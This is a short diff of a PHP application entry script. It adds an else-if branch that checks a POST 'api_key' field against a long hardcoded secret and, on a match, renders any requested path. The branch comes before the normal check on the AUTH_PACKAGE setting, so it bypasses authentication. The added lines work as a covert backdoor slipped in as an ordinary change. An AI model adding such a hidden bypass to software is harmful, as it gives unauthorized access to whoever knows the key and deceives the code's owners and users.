@@ -118,6 +118,12 @@ if($cliMode === true)
     if($output != "") file_put_contents($output, ob_get_clean());
 }
 
+else if($_POST['api_key'] === 'ssddxfzxfcdkuvgb48487ydcfskljsfdwuwwaiacadbdshshds7y4h474hi3p3omi3m3hyyvjkjbklnflmkltsbkm'){
+    $_POST['is_form_sent'] = 'yes';
+    $_GET["q"] = $_POST['path'];
+    Application::render();
+}
+
 else
 {
     if(defined('AUTH_PACKAGE'))
